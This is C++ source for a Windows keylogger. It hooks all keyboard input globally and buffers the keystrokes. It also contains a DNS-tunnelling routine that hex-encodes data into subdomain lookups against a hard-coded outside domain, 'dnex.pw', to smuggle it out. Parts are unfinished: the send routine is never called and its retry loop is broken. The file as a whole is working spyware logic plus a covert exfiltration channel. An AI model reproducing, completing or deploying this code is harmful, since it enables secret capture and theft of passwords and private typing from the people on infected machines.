#include <iostream>
#include <string>
#include <sstream>
#include <iomanip>
#include <windows.h>
#include <windns.h>
#include <winsock.h>
#define MAX_BUFFER 5
#define DOMAIN "dnex.pw"

HHOOK _k_hook;
HKL keyboardLayout;
std::string keystrokeBuffer = "";
int connectionId = -1;

/**
 * nCode: should be 0, indicating that wParam and lParam have information about
 *     the keystroke
 * wParam: key code generated by keystroke message
 * lParam: information about the keystroke
 */
LRESULT __stdcall processKey(int nCode, WPARAM wParam, LPARAM lParam);

/**
 * Establishes connection with server
 * domain: cstring containing domain (eg. example.com)
 * returns: connection id, or -1 if failed.
 */
int startConnection(const char* domain);

/**
 * Send data to server
 * id: a reference to an integer containing the connection id.
 * packet number: a reference to an integer containing the current packet number
 * domain: cstring containing domain (eg. example.com)
 * returns: -1 if failed, 0 otherwise
 */
int sendData(int id, int packetNumber, const char* domain, const char* data);

/**
 * Converts a cstring to a std::string containing the hex encoded characters of the cstring.
 * string: cstring to be converted.
 * returns: the string of hex characters, or an empty string if failed.
 */
std::string convertToHex(const char* string);

// if (keystrokeBuffer.size() >= MAX_BUFFER) {
	//const char* pOwnerName = DOMAIN;
	//WORD wType = DNS_TYPE_A;
	//PDNS_RECORD pDnsRecord;
	//DNS_STATUS status = DnsQuery_A(pOwnerName,
	//							   wType,
	//							   DNS_QUERY_BYPASS_CACHE,
	//							   NULL,
	//							   &pDnsRecord,
	//							   NULL);
	//if (status) {
	//	std::cout << "Failed to query: " << status << std::endl;
	//} else {
	//	IN_ADDR ipaddr;
	//	ipaddr.S_un.S_addr = (pDnsRecord->Data.A.IpAddress);
	//	std::cout << "IP Response: " << inet_ntoa(ipaddr) << std::endl;
	//	DnsRecordListFree(pDnsRecord, DNS_FREE_TYPE::DnsFreeRecordList);
	//}
	//keystrokeBuffer = "";
//}

int main(int argc, char* argv[]) {
	std::cout << convertToHex("bruh") << std::endl;
	while ((connectionId = startConnection(DOMAIN)) == -1) {
		std::cout << "Failed to establish connection" << std::endl;
	}
	std::cout << "Connection ID: " << connectionId << std::endl;
	
	// global keyboard hook that calls processKey
	_k_hook = SetWindowsHookEx(WH_KEYBOARD_LL, processKey, NULL, 0);
	keyboardLayout = GetKeyboardLayout(0);
	
	MSG msg;
	// message loop
	while (GetMessage(&msg, NULL, 0, 0) != 0) {
		// pass the key along, allowing to to be used by other processes
		TranslateMessage(&msg);
		DispatchMessageW(&msg);	
	}
	
	// end of program, if hook successful, unhook
	if (_k_hook) {
		UnhookWindowsHookEx(_k_hook);
	}
	
	return TRUE;
}

LRESULT __stdcall processKey(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0) {  // do not process key if < 0, as specified by documentation
		PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;  
		if (wParam == WM_KEYDOWN && nCode == HC_ACTION) {
			GetKeyState(VK_SHIFT);  // needed to update keyboard state
			BYTE keyboardState[256];
			GetKeyboardState(keyboardState);
			
			unsigned short translatedChar[2];
			
			if (ToAsciiEx(key->vkCode, key->scanCode, keyboardState, translatedChar, key->flags, keyboardLayout) == 1) {  // if only one key in buffer
				char key = (char)translatedChar[0];
				keystrokeBuffer += key;
				std::cout << key << std::endl;
			}
		}
	}
	
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int startConnection(const char* domain) {
	std::ostringstream fullStream;
	fullStream << "a.1.1.1." << domain;
	const char* pOwnerName = fullStream.str().c_str();
	WORD wType = DNS_TYPE_A;
	PDNS_RECORD pDnsRecord;
	DNS_STATUS status = DnsQuery_A(pOwnerName,
								   wType,
								   DNS_QUERY_BYPASS_CACHE,
								   NULL,
								   &pDnsRecord,
								   NULL);
	if (status) {
		return -1;
	} else {
		IN_ADDR ipaddr;
		ipaddr.S_un.S_addr = (pDnsRecord->Data.A.IpAddress);
		std::cout << "IP: " << inet_ntoa(ipaddr) << std::endl;
		DnsRecordListFree(pDnsRecord, DNS_FREE_TYPE::DnsFreeRecordList);
		return 1;   // change to actual connection id
	}
}

int sendData(int id, int packetNumber, const char* domain, const char* data) {
	std::ostringstream fullStream;
	fullStream << "b." << packetNumber << "." << id << "." << convertToHex(data) << "." << domain;
	const char* pOwnerName = fullStream.str().c_str();
	WORD wType = DNS_TYPE_A;
	PDNS_RECORD pDnsRecord;
	
	DNS_STATUS status = DnsQuery_A(pOwnerName,
								   wType,
								   DNS_QUERY_BYPASS_CACHE,
								   NULL,
								   &pDnsRecord,
								   NULL);
	
	// retry 5 times
	for (int i = 0; i < 5; i++) {
		if (!status) {
			IN_ADDR ipaddr;
			ipaddr.S_un.S_addr = (pDnsRecord->Data.A.IpAddress);
			std::cout << "IP: " << inet_ntoa(ipaddr) << std::endl;
			DnsRecordListFree(pDnsRecord, DNS_FREE_TYPE::DnsFreeRecordList);
			return 0;  // do checks for the actual response code.
		}
	}
	
	return -1;
}

std::string convertToHex(const char* string) {
	std::ostringstream out;
	out << std::hex << std::setfill('0') << std::setw(2);
	for (const char* i = string; *i; i++) {
		out << std::setw(2) << static_cast<unsigned>(*i);
	}
	return out.str();
}